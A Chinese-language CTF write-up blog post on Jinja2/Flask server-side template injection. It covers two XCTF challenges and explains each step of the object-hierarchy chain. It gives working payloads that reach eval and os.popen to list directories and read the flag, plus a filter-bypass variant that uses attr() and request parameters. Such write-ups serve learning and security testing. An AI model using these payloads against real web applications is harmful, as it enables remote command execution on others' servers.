---
title: SSTI
date: 2020-12-22 
description: XCTF华为专场的mine-1，触及到了知识盲区。这就是大佬们的签到题吗？
category: 信息安全
tags:
  - CTF
  - SSTI
---
# 老题新做,梦开始的地方
## 手工遍历的菜鸡，像极了当初的自己
攻防世界上的一道题：Web_python_template_injection，之前做过一次，这次感觉前前后后理解明白了（来源又是XCTF，这是杠上了）  
这道题什么都没有过滤  
ls的payload:
```
{% raw %}{{().__class__.__base__.__subclasses__()[71].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}{% endraw %}
```
为了防止忘了，还是把每个指令的作用记录一下
```
__class__返回参数类型	().__class__就返回了tuple类型
__base__或__mro__返回基类。__mro__其实返回的是解析方法调用的顺序（method resolution order），返回的东西多
__subclasses__获取基类的子类
__getitem__切片操作。'os'所在的'site._Printer'是78个，所以用77
__init__类的初始化方法
__globals__对包含函数全局变量的字典的引用
__builtins__里面是自建模块
eval可以把数据整合成str格式
__import__("os")加载os
```
这个题不能用下面的request的方法，会直接跳过{{}}，因为是不是`/msg={{}}`，而是`/{{}} ` 
`ls`查看的是当前目录
![ls当前目录](https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/master/assets/images/SSTI/ls%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95.png)
看到了fl4g文件  
`ls /`查看的是根目录
![根目录文件](https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/master/assets/images/SSTI/ls%E6%A0%B9%E7%9B%AE%E5%BD%95.png)
因为已经看到flag了，所以用`pwd`查看绝对路径，看看flag到底在哪个文件，假装自己遍历了
![在404](https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/master/assets/images/SSTI/pwd.png)
竟然在一个叫404的文件夹下面，刚开始还以为是url里的404  
`ls /404`可以看到flag文件
![看到了flag文件](https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/master/assets/images/SSTI/ls%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95.png)
最后用`cat fl4g`读取文件
![flag](https://raw.githubusercontent.com/HideonBlack/hideonblack.github.io/master/assets/images/SSTI/flag.png)
## 都0202年了，遍历这事还是写程序吧

# XCTF mine1_1
这道题大括号里过滤了`_` `[]` `''` `""`以及`args`  
如果只过滤`[]`的话，payload长这样：
```
{% raw %}{{().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}{% endraw %}
```
因为又过滤了下划线，payload长这样：
```
{% raw %}{{()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(77)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read(){% endraw %}
```
`args`没被过滤的话也能用。学长也有用`request.cookie.x1`做的，用bp抓包添加cookie值。
# 一个小插曲，我渗透我自己
写这篇文章的时候Jekyll竟然把`{% raw %}{{}}{% endraw %}`里面给我当liquid代码执行了。同学的hexo没问题，试了一下因为多终端过于憨批，折腾了半天又用回了Jekyll  
这CTF打的，我渗透我自己  
解决办法  
{% assign openTag = '{%' %}
```
{{ openTag }} raw %}
小爷我要打无数个大括号
{{ openTag }} endraw %}
```
那么奇奇怪怪的问题又增加了  
我是怎么打出来`{{ openTag }} raw %}`而没有被执行呢
```
{% raw %}
{% assign openTag = '{%' %}
{{ openTag }} raw %}
小爷我要打无数个大括号
{{ openTag }} endraw %}
{% endraw %}
```
打`{% raw %}{{ openTag }} raw %}{% endraw %}`的时候差点又忘了刚学的`{{ openTag }} raw %}`了，吐了吐了
